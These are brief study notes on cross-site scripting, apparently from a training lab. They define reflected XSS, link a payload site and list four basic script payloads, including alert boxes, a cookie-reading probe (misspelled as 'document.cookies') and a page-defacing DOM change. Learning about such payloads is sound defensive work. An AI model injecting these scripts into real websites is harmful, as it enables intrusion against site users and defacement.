# Cross-site Scripting

http://www.xss-payloads.com/



## Reflected XSS
only affects the person making the web request.





<script>alert(window.location.hostname)</script>
<script>alert(“Hello World”)</script>

<script>alert(document.cookies)</script>
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>